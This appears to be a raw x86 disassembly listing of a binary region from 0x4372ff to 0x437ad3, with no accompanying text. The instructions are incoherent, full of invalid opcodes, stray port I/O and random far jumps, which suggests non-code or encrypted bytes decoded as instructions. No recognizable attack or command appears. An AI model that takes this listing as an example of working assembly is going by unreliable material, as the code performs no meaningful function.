  4372ff:	ss sub ch,BYTE PTR gs:[esi+0x4d]
  437304:	inc    eax
  437305:	fild   DWORD PTR [edx-0x5af0caf5]
  43730b:	sbb    eax,0x1a852ec5
  437310:	sti    
  437311:	adc    DWORD PTR [edx+ebx*8],ebx
  437314:	or     BYTE PTR gs:[edx-0x76],ch
  437318:	mov    cl,al
  43731a:	leave  
  43731b:	xor    al,0xb6
  43731d:	add    dh,BYTE PTR [eax+edx*2-0x7954d733]
  437324:	adc    DWORD PTR [ebp-0x57],edi
  437327:	jmp    0x998b:0xf4988142
  43732e:	pop    esp
  43732f:	pop    ebp
  437330:	fcmove st,st(2)
  437332:	push   edx
  437333:	mov    DWORD PTR ds:0x2ca781da,edi
  437339:	in     eax,dx
  43733a:	call   0xe9e6e7e7
  43733f:	sbb    ebx,eax
  437341:	sbb    dl,bl
  437343:	addr16 push ds
  437345:	popa   
  437346:	adc    ebp,DWORD PTR [eax+eiz*1+0x50]
  43734a:	jecxz  0x4373b3
  43734c:	loopne 0x437393
  43734e:	jo     0x437384
  437350:	clc    
  437351:	lds    esp,FWORD PTR [esi-0x7a722ba0]
  437357:	mov    al,ds:0xad75dc0c
  43735c:	ins    DWORD PTR es:[edi],dx
  43735d:	mov    al,ds:0xc11d9a58
  437362:	int3   
  437363:	ror    bl,1
  437365:	xor    eax,0xd175bb41
  43736a:	mov    edi,0x4da8145a
  43736f:	adc    eax,edi
  437371:	into   
  437372:	lea    eax,ds:0x6dab46da
  437378:	das    
  437379:	mov    ebp,0xaa89c01e
  43737e:	or     eax,0x60d040c0
  437383:	pop    es
  437384:	mov    BYTE PTR [esi+0x2d],0x74
  437388:	adc    DWORD PTR [edx+esi*1+0x3d2aff80],esi
  43738f:	ja     0x437321
  437391:	sub    DWORD PTR [ebp-0x120d08eb],0x3b
  437398:	add    DWORD PTR [ecx+esi*2+0x7ef4dacb],esi
  43739f:	stos   DWORD PTR es:[edi],eax
  4373a0:	pop    edx
  4373a1:	arpl   WORD PTR [ebp+0x1d76808e],ax
  4373a7:	fld    TBYTE PTR [edx-0x65d78f22]
  4373ad:	test   al,0x58
  4373af:	mov    ds:0xddcded94,al
  4373b4:	push   ebx
  4373b5:	sbb    ebx,DWORD PTR ds:0x6cbdd04
  4373bb:	pop    ds
  4373bc:	ja     0x437359
  4373be:	(bad)  
  4373c0:	fimul  WORD PTR [ebx+edi*1]
  4373c3:	mov    ds:0x62f96040,al
  4373c8:	cli    
  4373c9:	fstp   st(6)
  4373cb:	add    BYTE PTR [eax+0x5f945d01],ah
  4373d1:	adc    al,0xa1
  4373d3:	add    BYTE PTR [edx+0xd],bh
  4373d6:	(bad)  
  4373d7:	cmp    eax,DWORD PTR [esi]
  4373d9:	sbb    al,0x36
  4373dc:	push   0xc
  4373de:	outs   dx,DWORD PTR ds:[esi]
  4373df:	dec    ebp
  4373e0:	rcr    BYTE PTR [ebp-0x6b],cl
  4373e3:	outs   dx,DWORD PTR ds:[esi]
  4373e4:	pop    ss
  4373e5:	ficom  DWORD PTR [eax+0x8]
  4373e8:	and    BYTE PTR [ebx+0x11358e36],bl
  4373ee:	add    BYTE PTR [edi-0x2efd2517],bh
  4373f4:	mov    dh,0x9b
  4373f6:	jno    0x437439
  4373f8:	sub    bl,BYTE PTR [eax]
  4373fa:	pusha  
  4373fb:	sub    BYTE PTR [ebx],0xda
  4373fe:	push   eax
  4373ff:	fsubr  QWORD PTR [ebx+0x7f]
  437402:	push   eax
  437403:	push   ds
  437404:	or     ebx,DWORD PTR [esi-0x3eaf2751]
  43740a:	mov    dh,0x20
  43740c:	out    dx,al
  43740d:	sbb    bh,BYTE PTR [ebx+ebx*4+0x65]
  437411:	xchg   ecx,eax
  437412:	inc    eax
  437413:	je     0x437480
  437415:	mov    al,BYTE PTR [edi+0x73d7c2d3]
  43741b:	mov    es,WORD PTR [eax]
  43741d:	fidiv  DWORD PTR [esi-0x16]
  437420:	(bad)  
  437421:	jp     0x4373d6
  437423:	shr    ebp,1
  437425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437426:	mov    BYTE PTR [ebp+0x1f554a85],al
  43742c:	mov    bh,al
  43742e:	lods   eax,DWORD PTR ss:[esi]
  437430:	inc    esp
  437431:	mov    ch,0x6d
  437433:	pop    ecx
  437434:	fst    DWORD PTR [ecx+edx*8]
  437437:	xchg   esp,edx
  437439:	ins    DWORD PTR es:[edi],dx
  43743a:	ins    DWORD PTR es:[edi],dx
  43743b:	inc    ebx
  43743c:	aad    0xc7
  43743e:	mov    ecx,0x835d2d79
  437443:	push   0x60bb6aff
  437448:	mov    ebx,0xfb109726
  43744d:	xchg   edi,eax
  43744e:	jae    0x4374c0
  437450:	cmp    BYTE PTR [eax-0x4f],dl
  437453:	add    DWORD PTR [eax-0x5f],esp
  437456:	mov    bl,0x4d
  437458:	jg     0x437496
  43745a:	xchg   ah,al
  43745c:	xchg   DWORD PTR [esi+0x45],esi
  43745f:	xlat   BYTE PTR ds:[ebx]
  437460:	jmp    0xe0a8:0xec262fd
  437467:	(bad)  
  437468:	add    BYTE PTR [ebp+0x26045c60],bl
  43746e:	cmc    
  43746f:	mov    ds:0x3c43ed5f,eax
  437474:	pushf  
  437475:	sub    al,0x23
  437477:	sub    BYTE PTR ds:0x5b451ba9,ah
  43747d:	pop    ebp
  43747e:	add    DWORD PTR [eax-0x1f],esp
  437481:	and    eax,0xa2db5b9a
  437486:	lods   eax,DWORD PTR ds:[esi]
  437487:	and    esp,DWORD PTR [edi+0x4a989b2e]
  43748d:	xlat   BYTE PTR ds:[ebx]
  43748e:	add    al,BYTE PTR [eax]
  437490:	mov    cl,0xb
  437492:	test   al,0x9b
  437494:	mov    edx,0xba2abd0d
  437499:	xchg   ebp,eax
  43749a:	les    esp,FWORD PTR ss:[edx+0x3]
  43749e:	push   0x1d170544
  4374a3:	adc    al,0x6d
  4374a5:	mov    ebx,0x5f88c4c
  4374aa:	sahf   
  4374ab:	hlt    
  4374ac:	enter  0xb5b1,0x89
  4374b0:	test   al,0x51
  4374b2:	xor    eax,0x4ef75f9e
  4374b7:	add    dl,cl
  4374b9:	ss inc ecx
  4374bb:	cli    
  4374bc:	aaa    
  4374bd:	or     al,0xb9
  4374bf:	fs ins BYTE PTR es:[edi],dx
  4374c1:	inc    ebp
  4374c2:	pop    ebp
  4374c3:	shr    DWORD PTR [ecx-0x72],1
  4374c6:	mov    fs,WORD PTR [ebp+edx*4+0x7e]
  4374ca:	jae    0x4374d9
  4374cc:	inc    ecx
  4374cd:	sub    cl,BYTE PTR [eax+0x1a]
  4374d0:	cmc    
  4374d1:	push   esi
  4374d2:	ret    
  4374d3:	add    BYTE PTR [eax],dh
  4374d5:	mov    ch,0x52
  4374d8:	rcr    DWORD PTR [eax+0x6b],1
  4374db:	test   dh,ch
  4374dd:	sbb    dl,cl
  4374df:	lods   eax,DWORD PTR ds:[esi]
  4374e0:	mov    eax,ds:0x4c90d336
  4374e5:	pop    eax
  4374e6:	mov    eax,0xa8c688bf
  4374eb:	fdiv   DWORD PTR [esi+0x54]
  4374ee:	pop    ebx
  4374ef:	shl    BYTE PTR [ebx+0xb],0x55
  4374f3:	adc    eax,0x641b0a17
  4374f8:	mov    dh,0x24
  4374fa:	loop   0x437569
  4374fc:	test   esi,esp
  4374fe:	sbb    ebp,eax
  437500:	(bad)  
  437501:	add    BYTE PTR [ebp-0x6d],al
  437504:	jecxz  0x437499
  437506:	pop    ss
  437507:	xor    eax,0x56a25460
  43750c:	rcl    DWORD PTR [ecx+0x45],1
  43750f:	mov    ah,0xcf
  437511:	in     eax,dx
  437512:	or     BYTE PTR [esi],ch
  437514:	xor    al,0xc
  437516:	sub    ecx,ebp
  437518:	aam    0x13
  43751a:	iret   
  43751b:	aad    0x2a
  43751d:	cs jne 0x437525
  437520:	(bad)  
  437521:	loop   0x437518
  437523:	cmp    eax,0x6a8b6dbd
  437528:	in     eax,dx
  437529:	mov    bh,0x9
  43752b:	int3   
  43752c:	mov    al,ds:0xd85972e1
  437531:	call   0x8272f740
  437536:	ja     0x437592
  437538:	scas   al,BYTE PTR es:[edi]
  437539:	adc    al,0x2d
  43753b:	pop    esp
  43753c:	pop    eax
  43753d:	mov    ecx,esi
  43753f:	push   ebp
  437540:	inc    ecx
  437541:	je     0x437507
  437543:	xor    dh,BYTE PTR [esi]
  437545:	sbb    ch,BYTE PTR [edx-0x68e5eea3]
  43754b:	cmp    edx,DWORD PTR [eax+0x5a]
  43754e:	js     0x437564
  437550:	or     esi,DWORD PTR [edi-0x3a22ff5b]
  437556:	gs push 0x6d5f7a6
  43755c:	or     BYTE PTR [esi],dh
  43755e:	loope  0x437513
  437560:	bound  ebx,QWORD PTR [eax+0x3b0d545]
  437566:	stos   BYTE PTR es:[edi],al
  437567:	or     eax,0x85f4a2c5
  43756c:	sbb    al,0xe9
  43756e:	mov    ch,0xdb
  437570:	(bad)  
  437571:	inc    esp
  437572:	xchg   DWORD PTR [eax],ebp
  437574:	lds    edi,FWORD PTR [esi-0x2c]
  437577:	repz and DWORD PTR [ebp+0x2dbabf15],ebp
  43757e:	jecxz  0x437529
  437580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437581:	daa    
  437582:	xlat   BYTE PTR ds:[ebx]
  437583:	retf   
  437584:	stc    
  437585:	cmc    
  437586:	(bad)  
  437587:	push   ss
  437588:	aam    0x10
  43758a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43758b:	sub    ebp,DWORD PTR [edi]
  43758d:	scas   eax,DWORD PTR es:[edi]
  43758e:	out    dx,al
  43758f:	bound  ebx,QWORD PTR [ebx-0x60]
  437592:	test   DWORD PTR [ecx-0x67],ecx
  437595:	mov    DWORD PTR [esi+0x11],ebx
  437598:	dec    ecx
  437599:	jne    0x4375ec
  43759b:	fwait
  43759c:	add    bh,BYTE PTR [esp+eax*8]
  43759f:	bswap  esp
  4375a1:	pop    edx
  4375a2:	cs ins BYTE PTR es:[edi],dx
  4375a4:	adc    al,0x6e
  4375a6:	jae    0x437598
  4375a8:	dec    edi
  4375a9:	cli    
  4375aa:	scas   al,BYTE PTR es:[edi]
  4375ab:	jmp    0x10473138
  4375b0:	je     0x43761d
  4375b2:	and    dh,BYTE PTR [edi+0x57]
  4375b5:	mov    DWORD PTR [edi],edx
  4375b7:	and    BYTE PTR [ecx-0x1d],al
  4375ba:	(bad)  
  4375bb:	ss jnp 0x43755c
  4375be:	jbe    0x437637
  4375c0:	clc    
  4375c1:	xchg   BYTE PTR [ebx-0x73],cl
  4375c4:	add    esi,DWORD PTR [ecx+0x63]
  4375c7:	imul   edi,DWORD PTR [edi-0x4a],0x38
  4375cb:	lock dec ebx
  4375cd:	fnstsw WORD PTR [ecx-0x55]
  4375d0:	test   al,0x1
  4375d2:	pusha  
  4375d3:	scas   al,BYTE PTR es:[edi]
  4375d4:	mov    esi,0x17fe9f3d
  4375d9:	mov    edx,0xb0dc6022
  4375de:	retf   0xea55
  4375e1:	js     0x437650
  4375e3:	inc    ebx
  4375e4:	add    al,0x6c
  4375e6:	lods   eax,DWORD PTR ds:[esi]
  4375e7:	pop    eax
  4375e8:	xor    eax,0x1b6bd807
  4375ed:	sbb    ebx,DWORD PTR [ebx]
  4375ef:	sbb    edi,DWORD PTR [edi]
  4375f1:	sub    edi,edi
  4375f3:	inc    edi
  4375f4:	mov    cl,0x3a
  4375f6:	arpl   WORD PTR [edi],di
  4375f8:	arpl   WORD PTR [ecx+0x4e918a01],sp
  4375fe:	jo     0x43765b
  437600:	clc    
  437601:	cld    
  437602:	retf   
  437603:	push   edx
  437604:	push   edi
  437605:	jne    0x4375ab
  437607:	cdq    
  437608:	sub    al,0x10
  43760a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43760b:	dec    ecx
  43760c:	adc    esi,DWORD PTR [ebp-0x5f]
  43760f:	add    DWORD PTR [ebx],ecx
  437611:	xor    al,0xdb
  437613:	call   ebx
  437615:	enter  0xdd94,0xda
  437619:	lea    esi,[edx-0x4f81f7b4]
  43761f:	int    0x98
  437621:	mov    dh,0x63
  437623:	scas   al,BYTE PTR es:[edi]
  437624:	or     eax,0x622b7444
  437629:	rcl    DWORD PTR [ecx],1
  43762b:	arpl   ax,bp
  43762d:	add    eax,0xb62f1756
  437632:	jne    0x43766c
  437634:	pusha  
  437635:	xchg   DWORD PTR [edx+0x55],esi
  437638:	and    ah,BYTE PTR [ecx-0x592d1dfd]
  43763e:	xchg   ebp,eax
  43763f:	sbb    DWORD PTR [ecx],eax
  437641:	xchg   edx,eax
  437642:	stos   DWORD PTR es:[edi],eax
  437643:	mov    ch,0xa0
  437645:	or     eax,0xdd947145
  43764a:	in     eax,0xce
  43764c:	retf   0xd11d
  43764f:	lods   eax,DWORD PTR ds:[esi]
  437650:	mov    DWORD PTR [esp+esi*8+0x5d1e76a1],edx
  437657:	outs   dx,DWORD PTR ds:[esi]
  437658:	push   0x40
  43765a:	mov    ah,0x85
  43765c:	mov    eax,0x205017ca
  437661:	add    BYTE PTR [edi+0x5d],al
  437664:	pop    edx
  437665:	into   
  437666:	jne    0x437624
  437668:	shr    BYTE PTR [edx+0x9],cl
  43766b:	je     0x4376ce
  43766d:	pop    ebx
  43766e:	pop    edx
  43766f:	(bad)  
  437670:	cld    
  437671:	retf   
  437672:	inc    esi
  437673:	das    
  437674:	pop    esp
  437675:	call   0xa176:0xdb54cf3b
  43767c:	fwait
  43767d:	sub    esi,DWORD PTR [ebx+ebx*8-0x12d6c808]
  437684:	ins    DWORD PTR es:[edi],dx
  437685:	loope  0x4376dd
  437687:	pop    ss
  437688:	(bad)  
  437689:	cmc    
  43768a:	popa   
  43768b:	cmp    eax,0xe0e8c71c
  437690:	(bad)  
  437692:	mov    ds:0xcabd0ea0,al
  437697:	mov    ebp,0x2eaddec5
  43769c:	fidiv  DWORD PTR [esi+0x32b3d739]
  4376a2:	retf   
  4376a3:	fwait
  4376a4:	js     0x437679
  4376a6:	stos   BYTE PTR es:[edi],al
  4376a7:	loop   0x4376fb
  4376a9:	stc    
  4376aa:	jp     0x4376b4
  4376ac:	add    ah,dh
  4376ae:	jmp    0x5054:0xd6d91cad
  4376b5:	fwait
  4376b6:	jo     0x437681
  4376b8:	push   esp
  4376b9:	sub    DWORD PTR [edi-0x56492a8f],ecx
  4376bf:	loop   0x4376be
  4376c1:	dec    eax
  4376c2:	inc    esi
  4376c3:	inc    ecx
  4376c4:	sbb    ah,al
  4376c6:	in     eax,dx
  4376c7:	sub    eax,0x3e05d4bf
  4376cc:	jno    0x4376b4
  4376ce:	dec    esp
  4376cf:	scas   al,BYTE PTR es:[edi]
  4376d0:	add    BYTE PTR [edi+0x2c],dl
  4376d3:	mov    ah,0x83
  4376d5:	xor    BYTE PTR [esi+0x45],0x1b
  4376d9:	pop    esi
  4376da:	jle    0x437756
  4376dc:	jne    0x4376de
  4376de:	je     0x437681
  4376e0:	inc    eax
  4376e1:	push   ebp
  4376e2:	daa    
  4376e3:	mov    cs,WORD PTR [esp+eax*4-0x46]
  4376e7:	aad    0x10
  4376e9:	pop    ebp
  4376ea:	or     BYTE PTR [ebx],ah
  4376ec:	push   ds
  4376ed:	push   esi
  4376ee:	loop   0x437690
  4376f0:	pop    ebp
  4376f1:	or     ebx,DWORD PTR ds:0xafe07d54
  4376f7:	push   cs
  4376f8:	ja     0x43769b
  4376fa:	adc    BYTE PTR [edx+0x6],bl
  4376fd:	sub    dh,BYTE PTR [esi-0x5204aaf5]
  437703:	pop    edi
  437704:	adc    cl,BYTE PTR [eax-0x3bef2913]
  43770a:	hlt    
  43770b:	mov    eax,0xbcb92c7e
  437710:	int    0xda
  437712:	ror    BYTE PTR [esi],1
  437714:	mov    cl,BYTE PTR [ebx]
  437716:	scas   eax,DWORD PTR es:[edi]
  437717:	mov    ecx,0xf9edb45d
  43771c:	in     al,dx
  43771d:	add    BYTE PTR [eax+0x53],ch
  437720:	loopne 0x437734
  437722:	mov    eax,ds:0x280e217f
  437727:	push   0x17
  437729:	adc    bl,bh
  43772b:	sub    eax,0x36dad17
  437730:	call   0x4b522aa9
  437735:	xor    al,al
  437737:	pop    esi
  437738:	aam    0x86
  43773a:	sub    BYTE PTR [esi-0x1a],ch
  43773d:	push   ebx
  43773e:	inc    esi
  43773f:	stos   BYTE PTR es:[edi],al
  437740:	gs in  al,dx
  437742:	add    DWORD PTR [eax-0x6041beca],ebp
  437748:	cmp    BYTE PTR [ebx-0x4ff275c6],dh
  43774e:	cmp    BYTE PTR [esi-0xa138e0c],ch
  437754:	repnz retf 0xdc41
  437758:	fsub   st,st(0)
  43775a:	jge    0x437792
  43775c:	cmp    al,0x33
  43775e:	in     eax,dx
  43775f:	ss add eax,0x7ff885d0
  437765:	out    0x35,al
  437767:	jo     0x43773e
  437769:	or     BYTE PTR [esi+0x5],dh
  43776c:	std    
  43776d:	mov    dh,0x1f
  43776f:	dec    edx
  437770:	pop    ds
  437771:	ds or  al,0x97
  437774:	mov    dh,0xb6
  437776:	add    ebx,0x1a2c2fbf
  43777c:	jp     0x437767
  43777e:	or     edx,esi
  437780:	push   0x9e6c7e8a
  437785:	(bad)  
  437786:	nop
  437787:	fwait
  437788:	sub    BYTE PTR [esi],ah
  43778a:	in     al,dx
  43778b:	or     eax,0xca5a5c11
  437790:	int3   
  437791:	adc    al,0x58
  437793:	adc    al,0xb9
  437796:	add    edi,edx
  437798:	sub    BYTE PTR [eax-0x1400e246],cl
  43779e:	adc    al,0x6d
  4377a0:	mov    bh,0xad
  4377a2:	ins    BYTE PTR es:[edi],dx
  4377a3:	sbb    ch,BYTE PTR [esi]
  4377a5:	mov    WORD PTR [ebp+edx*1-0x7d5fe165],es
  4377ac:	sbb    ecx,DWORD PTR ds:0x5b84804a
  4377b2:	push   0x68
  4377b4:	mov    bh,0x6d
  4377b6:	imul   ebx,DWORD PTR [edx],0xfffffffd
  4377b9:	add    eax,0xdae0e008
  4377be:	dec    esi
  4377bf:	mov    dh,0x41
  4377c1:	mov    al,ds:0x2e5a5a8d
  4377c6:	out    dx,eax
  4377c7:	fcmove st,st(6)
  4377c9:	fisubr WORD PTR [edx*2-0x7cd51394]
  4377d0:	and    BYTE PTR [ecx-0x5e],bl
  4377d3:	addr16 add ah,cl
  4377d6:	xor    BYTE PTR [esi],0x85
  4377d9:	cmp    BYTE PTR [ecx+0x6c440de0],dh
  4377df:	sub    dl,0x30
  4377e2:	shr    BYTE PTR [edx+0xed0602f],0x68
  4377e9:	push   edi
  4377ea:	jo     0x437837
  4377ec:	jbe    0x437828
  4377ee:	push   es
  4377ef:	mov    ebp,0x50da20bb
  4377f4:	xor    ah,BYTE PTR [ebp+0x66]
  4377f7:	not    DWORD PTR [ebx+0x6a]
  4377fa:	fist   DWORD PTR [edx+0x4d]
  4377fd:	push   eax
  4377fe:	clc    
  4377ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437800:	xor    DWORD PTR [edx-0x41],0x89aa3586
  437807:	stos   BYTE PTR es:[edi],al
  437808:	mov    edi,0x237b4ee2
  43780d:	sbb    ah,BYTE PTR [edx-0x7395dcd2]
  437813:	nop
  437814:	jo     0x437824
  437816:	outs   dx,BYTE PTR ds:[esi]
  437817:	mov    ah,0x65
  437819:	imul   eax,edi,0x25
  43781c:	(bad)  
  43781d:	dec    ebx
  43781e:	xor    ch,ch
  437820:	fldenv [esi]
  437822:	adc    BYTE PTR [eax-0x1940f7d7],dh
  437828:	fisubr WORD PTR [edi+esi*4-0x7a]
  43782c:	(bad)  
  43782e:	push   ebx
  43782f:	std    
  437830:	mov    eax,0x3f5f3271
  437835:	(bad)  
  437836:	mov    al,ds:0x6da9682d
  43783b:	fisttp DWORD PTR [ecx+0x22953b3]
  437841:	mov    ch,0xa1
  437843:	or     BYTE PTR [ebx+0x47],0x21
  437847:	ins    BYTE PTR es:[edi],dx
  437848:	cwde   
  437849:	js     0x43789e
  43784b:	inc    ecx
  43784c:	pop    ds
  43784d:	add    BYTE PTR ss:[esi],al
  437850:	int3   
  437851:	dec    ebx
  437852:	hlt    
  437853:	push   0x62a1b447
  437858:	add    eax,DWORD PTR [eax]
  43785a:	stc    
  43785b:	xchg   DWORD PTR [edx],ebp
  43785d:	call   FWORD PTR [esi+0x75b836]
  437863:	sbb    al,0x14
  437865:	(bad)  
  437866:	lods   eax,DWORD PTR ds:[esi]
  437867:	fldcw  WORD PTR [ebp-0x2449dfc3]
  43786d:	push   esi
  43786e:	add    dh,BYTE PTR [ecx]
  437870:	inc    ecx
  437871:	test   DWORD PTR [eiz*2-0x75a5c2ee],0x52c89826
  43787c:	scas   al,BYTE PTR es:[edi]
  43787d:	call   0x35fc2223
  437882:	pop    ecx
  437883:	lea    edi,[ebp-0x64]
  437886:	sub    BYTE PTR [ebx],ch
  437888:	rcl    BYTE PTR [eax+ecx*4-0x458bac98],0x23
  437890:	loopne 0x4378fa
  437892:	popa   
  437893:	inc    edi
  437894:	inc    eax
  437895:	aaa    
  437896:	sbb    dl,BYTE PTR [ebp-0x59]
  437899:	ss and eax,0x9a97759a
  43789f:	jmp    0x95da:0xaf25a156
  4378a6:	cli    
  4378a7:	and    eax,DWORD PTR [eax+0x6d513409]
  4378ad:	dec    ebx
  4378ae:	xor    eax,0xcc3a1ab4
  4378b3:	imul   bp,bx,0x2e02
  4378b8:	addr16 pop ebx
  4378ba:	in     al,0xe4
  4378bc:	std    
  4378bd:	jecxz  0x4378c4
  4378bf:	loopne 0x437881
  4378c1:	lea    ebp,[ebp+0x63]
  4378c4:	nop
  4378c5:	adc    cl,BYTE PTR [eax]
  4378c7:	lds    ebp,FWORD PTR [edx+0x27]
  4378ca:	out    dx,eax
  4378cb:	xchg   BYTE PTR [eax-0x6bba25ac],dh
  4378d1:	dec    edx
  4378d2:	mov    ds:0x16e7a138,al
  4378d7:	add    BYTE PTR [edx-0x4c],cl
  4378da:	rcr    BYTE PTR [eax+0x30],1
  4378dd:	dec    ecx
  4378de:	lea    ecx,[eax+0x2d95b0b]
  4378e4:	sbb    ch,BYTE PTR [eax-0x4]
  4378e7:	(bad)  
  4378e9:	test   DWORD PTR [ecx-0x3fde4fe3],ecx
  4378ef:	xchg   ebp,eax
  4378f0:	xor    al,dh
  4378f2:	mov    bl,0xe
  4378f4:	icebp  
  4378f5:	sub    ch,BYTE PTR [edx-0x5f]
  4378f8:	jmp    0x6976:0xdb22a684
  4378ff:	imul   edx,DWORD PTR [ebx],0xffffffe5
  437902:	das    
  437903:	xchg   esi,eax
  437904:	add    dh,BYTE PTR [edi]
  437906:	mov    bl,BYTE PTR [ecx-0x6b]
  437909:	dec    ebp
  43790a:	inc    ecx
  43790b:	or     ebx,DWORD PTR [ebp+0x5]
  43790e:	ins    DWORD PTR es:[edi],dx
  43790f:	add    bl,BYTE PTR [esi+0x50]
  437912:	sbb    ah,0x9a
  437915:	mov    dh,0xad
  437917:	sub    DWORD PTR [eax+0x17f7cc74],ebp
  43791d:	jmp    0x437921
  43791f:	outs   dx,DWORD PTR ds:[esi]
  437920:	mov    al,0x75
  437922:	push   ecx
  437923:	pop    ebp
  437924:	clc    
  437925:	mov    esi,0xb67de3c2
  43792a:	adc    edx,DWORD PTR [esp+ebx*2+0x30]
  43792e:	stc    
  43792f:	dec    ecx
  437930:	fisttp WORD PTR [edx]
  437932:	sbb    DWORD PTR [ebp-0x70974493],ebp
  437938:	or     bl,BYTE PTR ds:0x2405c026
  43793e:	in     al,dx
  43793f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437940:	dec    ebp
  437941:	pop    ebx
  437942:	pop    ss
  437943:	lds    ebx,FWORD PTR [edx+ecx*1+0x16]
  437947:	mov    BYTE PTR ds:0x173ef2af,al
  43794d:	sub    BYTE PTR ss:[ecx+ebp*1-0x20],ch
  437952:	dec    ecx
  437953:	gs xchg edx,eax
  437955:	sbb    DWORD PTR [esi+0xa],edi
  437958:	pushf  
  437959:	mov    edx,0x4bbb4075
  43795e:	inc    esp
  43795f:	xlat   BYTE PTR ds:[ebx]
  437960:	mov    ch,BYTE PTR [edx]
  437962:	add    al,bl
  437964:	mov    eax,0xf322b845
  437969:	sub    eax,0x74500d97
  43796e:	jmp    0x437921
  437970:	fs gs imul ebx,edx,0xffffff8f
  437975:	ficom  DWORD PTR ds:0x458d1300
  43797b:	in     eax,dx
  43797c:	jbe    0x437981
  43797e:	test   DWORD PTR [esi-0x1fcdd246],ecx
  437984:	adc    eax,esp
  437986:	or     eax,ebx
  437988:	pushf  
  437989:	std    
  43798a:	or     ecx,DWORD PTR [ebp+0x15]
  43798d:	fist   DWORD PTR [esi+ebx*1-0x43efcbfb]
  437994:	mov    BYTE PTR [eax+eax*1+0x536e15b8],dh
  43799b:	mov    esp,0x821182df
  4379a0:	push   ss
  4379a1:	rol    BYTE PTR [ebp+0x11496b6d],1
  4379a7:	cmp    edi,DWORD PTR [eax+0x4a]
  4379aa:	pop    DWORD PTR [esi+0x2b]
  4379ad:	pop    eax
  4379ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4379af:	jmp    0x5f7f:0x8afe1742
  4379b6:	jo     0x437a30
  4379b8:	ins    DWORD PTR es:[edi],dx
  4379b9:	pop    ebp
  4379ba:	adc    DWORD PTR [edi+0x154ac557],esi
  4379c0:	adc    bl,0x2
  4379c3:	call   FWORD PTR [ebp+0x616d2e81]
  4379c9:	push   0x74
  4379cb:	ror    DWORD PTR [edx+ecx*2+0x7d],1
  4379cf:	loopne 0x43796c
  4379d1:	add    dl,bl
  4379d3:	outs   dx,BYTE PTR ds:[esi]
  4379d4:	or     edx,eax
  4379d6:	mov    ss,ecx
  4379d8:	sbb    BYTE PTR [edx],dl
  4379da:	mov    esp,cs
  4379dc:	sub    al,0xdb
  4379de:	mov    dh,0x6d
  4379e0:	push   esi
  4379e1:	ins    BYTE PTR es:[edi],dx
  4379e2:	add    eax,0xb0162c4
  4379e7:	mov    dh,0xdc
  4379e9:	(bad)  
  4379ea:	mov    BYTE PTR [ebp-0x5f],ah
  4379ed:	sbb    al,0x97
  4379ef:	xor    BYTE PTR [eax+0x6cb2ed05],bl
  4379f5:	(bad)  [edx+0x62]
  4379f8:	mov    edi,0x7072100b
  4379fd:	xor    eax,0x6c2db602
  437a02:	mov    dl,dl
  437a04:	mov    bh,0x96
  437a06:	rol    ecx,1
  437a08:	lds    ebp,FWORD PTR [ebx+0x49]
  437a0b:	retf   
  437a0c:	xchg   edi,eax
  437a0d:	outs   dx,DWORD PTR ds:[esi]
  437a0e:	pop    ebp
  437a0f:	shl    DWORD PTR [edx+0x7a0248a9],1
  437a15:	xchg   edx,eax
  437a16:	add    BYTE PTR [edx],ch
  437a18:	mul    edx
  437a1a:	sub    BYTE PTR [esi],dh
  437a1c:	mov    dh,0xcb
  437a1e:	add    BYTE PTR [eax+0x2a],cl
  437a21:	repnz push esi
  437a23:	jge    0x437a00
  437a25:	jmp    0x6f3:0x3aa5f2db
  437a2c:	inc    edx
  437a2d:	ss adc al,0x0
  437a30:	loop   0x4379b5
  437a32:	add    al,dh
  437a34:	inc    ecx
  437a35:	pop    ebp
  437a36:	xchg   esi,eax
  437a37:	in     eax,0x3a
  437a39:	add    BYTE PTR [ebx],al
  437a3b:	mov    ah,0xde
  437a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437a3e:	test   eax,0x135ba283
  437a43:	shl    BYTE PTR [eax+0x7fd1bb14],cl
  437a49:	mov    eax,ds:0x78aa2960
  437a4e:	xchg   edi,eax
  437a4f:	test   BYTE PTR [edx-0x5f495dc6],0xd8
  437a56:	jg     0x437a7a
  437a58:	push   eax
  437a59:	shr    ch,0xb6
  437a5c:	ins    DWORD PTR es:[edi],dx
  437a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437a5e:	ins    BYTE PTR es:[edi],dx
  437a5f:	retf   
  437a60:	dec    ebx
  437a61:	inc    edi
  437a62:	cmp    al,0xb9
  437a64:	xor    al,0x4e
  437a66:	add    eax,0x6c2e00bb
  437a6b:	loopne 0x437a51
  437a6d:	pop    ebx
  437a6e:	sbb    BYTE PTR [ecx-0x60],bh
  437a71:	out    0x86,eax
  437a73:	mov    dh,0x6c
  437a75:	or     eax,0x2f67cf10
  437a7a:	fldcw  WORD PTR [edi-0x5c]
  437a7d:	add    BYTE PTR [esi],dl
  437a7f:	(bad)  
  437a80:	stc    
  437a81:	and    BYTE PTR [esi],bl
  437a83:	add    BYTE PTR [edx-0x68],al
  437a86:	xchg   ebx,eax
  437a87:	sbb    BYTE PTR [ebp+0x44],0xb1
  437a8b:	ins    DWORD PTR es:[edi],dx
  437a8c:	push   edi
  437a8d:	mov    eax,0xc87ef2c9
  437a92:	fsub   DWORD PTR [ebx-0x2b93d160]
  437a98:	push   edi
  437a99:	dec    esp
  437a9a:	cmp    BYTE PTR [ebp-0x37],cl
  437a9d:	pop    ebp
  437a9e:	rol    DWORD PTR [ebp-0x730f044a],0x79
  437aa5:	lock lods eax,DWORD PTR ds:[esi]
  437aa7:	push   esi
  437aa8:	push   cs
  437aa9:	(bad)  
  437aab:	inc    esp
  437aac:	pop    ebx
  437aad:	retf   0x3f35
  437ab0:	fisub  WORD PTR [edi]
  437ab2:	repz add BYTE PTR [ebp-0x78],ch
  437ab6:	mov    ds:0x7a2cf798,al
  437abb:	pop    eax
  437abc:	xchg   esi,eax
  437abd:	lea    ecx,ds:0x3fe63c2f
  437ac3:	inc    dh
  437ac5:	fiadd  WORD PTR [eax]
  437ac7:	pop    eax
  437ac8:	sub    bh,BYTE PTR [esi-0x125610d0]
  437ace:	xor    eax,0xeea6b6a0
  437ad3:	xchg   edx,eax
